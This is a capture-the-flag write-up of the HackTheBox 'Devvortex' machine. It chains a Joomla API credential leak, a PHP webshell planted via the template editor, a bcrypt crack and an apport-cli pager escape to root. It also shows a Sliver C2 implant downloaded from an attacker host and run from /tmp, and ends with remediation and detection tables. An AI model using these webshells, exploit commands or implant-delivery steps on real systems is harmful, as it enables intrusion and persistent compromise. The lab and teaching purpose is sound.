---
layout: default
title: "HackTheBox - Devvortex"
---

# HackTheBox - Devvortex

**OS:** Ubuntu 20.04.6 LTS (Linux)

Devvortex is an easy Linux web box built around a Joomla 4.2.6 CMS instance
hidden behind a virtual host. An unauthenticated API information-disclosure
vulnerability (CVE-2023-23752) leaks the MySQL credentials directly from the
Joomla configuration endpoint. Those credentials open the admin panel, where the
built-in template file editor is abused to drop a PHP webshell. MySQL gives us a
bcrypt hash for the `logan` system account, which cracks to a short word in
rockyou. SSH as `logan` reveals `sudo /usr/bin/apport-cli`, vulnerable to a less
pager escape (CVE-2023-1326), granting a root shell.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (devvortex.htb) |
| Initial Access | CVE-2023-23752 Joomla API cred leak, template PHP webshell, MySQL hash dump, bcrypt crack |
| Privilege Escalation | CVE-2023-1326 apport-cli pager escape |
| Final Access | `root` |

---

## Recon

### Port Scan

A quick TCP top-ports sweep (driven via p0rtix `discovery.tcp_quick` then
`svc.version_detect`) returned two services:

```
$ nmap -p- --min-rate 5000 <target-ip> -oN nmap/full.txt
$ nmap -sCV -p22,80 <target-ip>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp open  http    nginx/1.18.0 (Ubuntu)
```

Port 80 redirected to `http://devvortex.htb/` -- added to `/etc/hosts`.

### Vhost Discovery

The main `devvortex.htb` serves a static marketing page. A vhost bust revealed a
second subdomain:

```
$ ffuf -u http://<target-ip>/ -H "Host: FUZZ.devvortex.htb" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -fc 302 -t 30

dev                     [Status: 200, Size: 23221]
```

`dev.devvortex.htb` returns a 200 (added to `/etc/hosts`).

### Web Fingerprint

```
$ whatweb --no-errors -a 3 http://dev.devvortex.htb
http://dev.devvortex.htb [200 OK] Bootstrap, Cookies[1daf6e3366587cf9ab315f8ef3b5ed78],
  JQuery, Joomla, nginx/1.18.0 (Ubuntu)
```

The `1daf6e33...` cookie (32-char hex, MD5-style) and the no-cache `Expires:
Wed, 17 Aug 2005` header are classic Joomla fingerprints. Confirmed:

```
$ curl -s http://dev.devvortex.htb/administrator/manifests/files/joomla.xml \
    | grep '<version>'
<version>4.2.6</version>
```

---

## Initial Access

### CVE-2023-23752 -- Joomla Unauthenticated API Information Disclosure

Joomla 4.0.0 through 4.2.7 exposes the application configuration, including the
database credentials, through an unauthenticated REST API endpoint. The fix in
4.2.8 adds authentication to the `public` config fields.

```
$ curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' \
    | python3 -m json.tool | grep -E '"user"|"password"|"db"'
    {"type":"application","id":"224","attributes":{"user":"lewis","id":224}},
    {"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},
    {"type":"application","id":"224","attributes":{"db":"joomla","id":224}},
```

Database credentials: `lewis:P4ntherg0t1n5r3c0n##`, database `joomla`.

> **Why this works:** The Joomla API framework in 4.0-4.2.7 incorrectly treats
> the `config/application` endpoint as read-only-public data, skipping the
> authentication middleware entirely. The configuration object includes live
> database credentials.

### Joomla Admin Login

The same DB credentials work for the Joomla admin panel at
`http://dev.devvortex.htb/administrator/`:

```
POST /administrator/index.php
username=lewis&passwd=P4ntherg0t1n5r3c0n%23%23&option=com_login&task=login
  -> 303 redirect -> 200 "Home Dashboard"
```

Confirmed by the `Home Dashboard` title in the response.

### Template File Editor -- PHP Webshell

Joomla admin includes a live PHP file editor under System > Templates. The
Cassiopeia site template (ID 223) exposes the `error.php` file, which Joomla
renders for any 4xx/5xx error. Injecting a webshell at the top of the file and
forcing the output buffer to flush before Joomla's own buffered output produces
clean RCE output:

```php
<?php while(ob_get_level())ob_end_clean();
if(isset($_REQUEST["cmd"])){
    echo "<pre>"; passthru($_REQUEST["cmd"]); echo "</pre>"; exit;
}?>
```

Saved via `template.apply` (POST to `/administrator/index.php`). Triggered by
requesting any non-existent path (Joomla serves error.php as the 404 handler):

```
$ curl -s 'http://dev.devvortex.htb/nonexistent?cmd=id'
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

> **Why this works:** Joomla loads the template's `error.php` for every error
> response. By clearing all active output buffers first, the webshell's output
> reaches the HTTP response directly rather than being swallowed by Joomla's
> own `ob_start()` wrapper. `exit` prevents the normal error page from
> appending after the command output.

The error.php approach was intermittently reset by the Joomla session. A more
stable approach: write a standalone PHP file directly to the template directory
from within the first successful webshell request:

```
$ curl -s 'http://dev.devvortex.htb/nonexistent' \
    --data "cmd=echo '<?php passthru(\$_GET[\"x\"]);?>' \
    > /var/www/dev.devvortex.htb/templates/cassiopeia/shell.php"
$ curl -s 'http://dev.devvortex.htb/templates/cassiopeia/shell.php?x=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### MySQL Credential Dump -- Joomla Users Hashes

With RCE as `www-data`, the DB credentials from the API leak are used directly
against the local MySQL instance:

```
www-data@devvortex$ mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla \
    -e 'SELECT name,username,password FROM sd4fg_users;'

name        username  password
lewis       lewis     $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
logan paul  logan     $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

Two bcrypt (`$2y$10$`) hashes. Cost factor 10.

### Hash Crack -- logan

```
$ echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' \
    > logan.hash
$ john --format=bcrypt --wordlist=/path/to/rockyou.txt logan.hash

logan paul  (logan)    tequieromucho
```

### User Flag

```
$ ssh logan@<target-ip>
logan@<target-ip>'s password: tequieromucho

logan@devvortex:~$ cat user.txt
<user-flag-redacted>
```

---

## Privilege Escalation

### sudo Enumeration

```
logan@devvortex:~$ sudo -l
[sudo] password for logan: tequieromucho

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

`logan` can run `/usr/bin/apport-cli` as any user (including root) with no
argument restrictions.

### CVE-2023-1326 -- apport-cli Pager Escape to Root

`apport-cli` is Ubuntu's crash report helper. Versions before 2.26.1 (Ubuntu
20.04 ships 2.20.11) open crash reports in a `less` pager running as the
invoking user -- which, when called through `sudo`, is root. From inside `less`,
any command prefixed with `!` executes in a shell inherited from the pager
process.

**Steps:**

1. Generate a crash file in `/var/crash/`:

```
logan@devvortex:~$ sleep 10 &
[1] 1846
logan@devvortex:~$ kill -SIGSEGV %1
[1]+  Segmentation fault  (core dumped) sleep 10
logan@devvortex:~$ ls /var/crash/
_usr_bin_sleep.1000.crash
```

2. Open the crash file with `sudo apport-cli` and select View (V) to enter
the less pager:

```
logan@devvortex:~$ sudo /usr/bin/apport-cli /var/crash/_usr_bin_sleep.1000.crash

*** Send problem report to the developers?
  S: Send report (29.9 KB)
  V: View report
  K: Keep report file for sending later
  I: Cancel and ignore future crashes of this version
  C: Cancel
Please choose (S/V/K/I/C): V

*** Collecting problem information
...............................................................................
```

3. Once the report loads in `less`, type `!/bin/bash` to break out to a root
shell:

```
(END)!/bin/bash
root@devvortex:/home/logan#
```

4. Root flag:

```
root@devvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
root@devvortex:~# cat /root/root.txt
<root-flag-redacted>
```

> **Why this works:** `apport-cli` is not hardened against pager escapes. It
> sets no `LESSSECURE=1` and does not run the pager with restricted
> capabilities. Since the entire process runs as root under `sudo`, the `!cmd`
> feature of `less` spawns a shell with `uid=0`. The fix in 2.26.1 passes
> `--no-less-filters` and guards the pager invocation.

---

## Post-Exploitation: Sliver C2

To model realistic operator tradecraft beyond the one-shot shell, a Sliver C2
implant was generated and deployed. The goal is a resilient, encrypted command
channel that survives a web server restart and provides the staging point for
further post-exploitation (persistence, lateral movement, data collection) --
the foothold a real adversary would hold before the engagement is detected.

### Listener and Implant Generation

An HTTPS listener on port 4443 is started on the attack box, then a Linux
session implant is generated pointing at it:

```
$ sliver

          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒

[*] Server v1.7.3
[*] Welcome to the sliver shell, please type 'help' for options

[127.0.0.1] sliver > https -L 0.0.0.0 -l 4443

[*] Starting HTTPS :4443 listener ...
[*] Successfully started job #8

[127.0.0.1] sliver > generate --os linux --arch amd64 --protocol https \
    --lhost <attacker-ip> --lport 4443 --name devvortex --save ~/sliver-payloads/

[*] Generating new linux/amd64 implant binary
[!] Symbol obfuscation is enabled.
[*] Build completed in 47s
[*] Implant saved to ~/sliver-payloads/devvortex (33 MB)
```

### Delivery via www-data Webshell

The implant is served from the attack box over a Python HTTP server and
fetched by the target through the `shell.php` backdoor already in place:

```
www-data@devvortex:/var/www/dev.devvortex.htb/templates/cassiopeia$ \
  curl -s http://<attacker-ip>:8080/devvortex -o /tmp/.devvortex
www-data@devvortex:...$ chmod +x /tmp/.devvortex && nohup /tmp/.devvortex > /dev/null 2>&1 &
[1] 2679
```

### Session Callback

The implant calls back over HTTPS within a few seconds:

```
[*] Session 405e8572 devvortex - <target-ip>:36682 (devvortex) - linux/amd64
    Fri, 26 Jun 2026 05:49 UTC

[127.0.0.1] sliver > use 405e8572

[*] Active session devvortex (405e8572-c43a-45b9-b54f-fcca30fdf634)

[127.0.0.1] sliver (devvortex) > info

        Session ID: 405e8572-c43a-45b9-b54f-fcca30fdf634
              Name: devvortex
          Hostname: devvortex
              UUID: (runtime)
          Username: www-data
               UID: 33
               GID: 33
                OS: linux
              Arch: amd64
         Remote Address: <target-ip>:36682
            PID: 2679
           Filename: /tmp/.devvortex
        Active C2: https://<attacker-ip>:4443

[127.0.0.1] sliver (devvortex) > execute /usr/bin/id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

[127.0.0.1] sliver (devvortex) > execute /usr/bin/hostname

devvortex
```

### Adversary Position

The session runs as `www-data` -- the same principal that delivered the initial
webshell. From here a real adversary would:

- **Establish persistence** -- write an SSH authorized key for `www-data`, drop
  a systemd user timer, or register a PHP autoloader hook so the implant
  survives a web server restart.
- **Move laterally** -- `logan:tequieromucho` is now known; the same password
  may reuse to internal services. The root shell from the apport-cli privesc
  could drop a root-owned implant or modify `/etc/sudoers`.
- **Collect secrets** -- `/etc/shadow` (now readable as root), any SSH private
  keys in `/home/*/.ssh/`, database contents beyond `sd4fg_users`.

The Sliver session closes the loop on the attack chain: the operator has a
stable encrypted C2 foothold, not just a transient shell.

> **Why HTTPS on 4443:** TLS-wrapped C2 traffic is indistinguishable from
> normal web traffic at the wire level. Using a high port (4443) avoids the
> privileged-bind requirement while keeping the HTTP(S) beaconing benefits.
> On a real engagement the implant would call back to a redirector and use
> domain-fronting or a cloud CDN to further obscure the beacon destination.

---

## Root Cause

The exploit chain required three independent weaknesses, each trivially
preventable:

1. **Joomla 4.2.6 (CVE-2023-23752):** The REST API exposed database credentials
   without authentication. Fixed in 4.2.8.

2. **Credential reuse across application and OS layers:** The MySQL password
   `P4ntherg0t1n5r3c0n##` was also the Joomla admin password, giving a second
   entry point and reducing the blast radius of any single secret being rotated.

3. **`sudo apport-cli` without pager restrictions (CVE-2023-1326):** Granting
   unconstrained `sudo` on an interactive crash reporter that spawns a root
   pager is equivalent to granting a root shell.

---

## Impact

An unauthenticated remote attacker can achieve full root compromise in three
steps: call the public API, log in to the admin panel, and crack one bcrypt
hash. No exploit code beyond standard curl is required for the initial foothold.

---

## Remediation

| Priority | Finding | Fix |
|---|---|---|
| Critical | Joomla 4.2.6 CVE-2023-23752 | Upgrade to Joomla >= 4.2.8 (or 5.x) |
| Critical | `sudo /usr/bin/apport-cli` (CVE-2023-1326) | Remove the sudo rule; if crash reporting is needed, scope it narrowly (e.g. `NOEXEC`) or upgrade to apport >= 2.26.1 |
| High | Database credential in Joomla admin panel | Rotate `lewis` DB password; use a dedicated low-privilege DB user per application |
| High | Weak bcrypt password for `logan` | Enforce a minimum passphrase length and complexity for system accounts |
| Medium | Admin template file editor accessible | Disable the template file manager in Joomla's Global Configuration if not needed (`System > Global Configuration > Templates > Allow editing of template files`) |

### Validation

- Upgrade Joomla: `curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true'` should return `401 Unauthorized`.
- Remove sudo rule: `sudo -l` as `logan` should not list `apport-cli`.
- Rotate DB password: `mysql -u lewis -p'<old>' joomla` should fail.
- Password policy: `passwd logan` -- enforce policy via PAM (`pam_pwquality`).

---

## Detection Opportunities

| Signal | Event |
|---|---|
| CVE-2023-23752 exploitation | `GET /api/index.php/v1/config/application?public=true` from an IP with no prior login session -- nginx access log, Joomla audit log |
| Joomla template file modification | Joomla audit log: `com_templates` `apply` task by any user; filesystem inotify on `/var/www/*/templates/` |
| Webshell execution | PHP-FPM slow log or modsecurity rule on `passthru`/`system`/`exec` in web request output; `www-data` spawning unexpected child processes |
| MySQL access from web process | MySQL general log: `lewis` connecting from `localhost` at unusual hours or issuing `SELECT ... FROM sd4fg_users` |
| apport-cli sudo | auditd rule on `sudo` + `apport-cli`; alert on `less` spawning `bash` as child of a `sudo`ed process |

---

## Lessons Learned

- **Joomla version matters.** The CVE-2023-23752 API endpoint is the intended path for many recent Joomla boxes; always check `/administrator/manifests/files/joomla.xml` for the version before spending time on other attack surface.
- **Credential reuse is the real exploit.** The DB password opened three doors: MySQL, Joomla admin, and confirmed the DB password pattern. Always check reuse before cracking.
- **Output buffering in Joomla.** PHP webshells inside Joomla's template files need explicit `ob_end_clean()` to flush before Joomla's own buffered HTML is appended. A standalone PHP file in the template directory is more reliable.
- **apport-cli pager escape.** Any sudo-able interactive tool that drops to a pager (less, more, man, systemctl status) is a privesc vector unless `LESSSECURE=1` is set or the binary uses `NOEXEC`. Always check `sudo -l` output against GTFOBins and the CVE database.

---

## Cleanup

- Removed `shell.php` webshell from `/var/www/dev.devvortex.htb/templates/cassiopeia/`
- Restored `error.php` to its original content via the Joomla template editor
- Removed `/tmp/.devvortex` Sliver implant and `/var/crash/_usr_bin_sleep.1000.crash`
- Terminated Sliver session 405e8572 and HTTPS listener job #8
- All actions were in-memory or cleaned up; no AD objects or ACLs modified (Linux-only box)
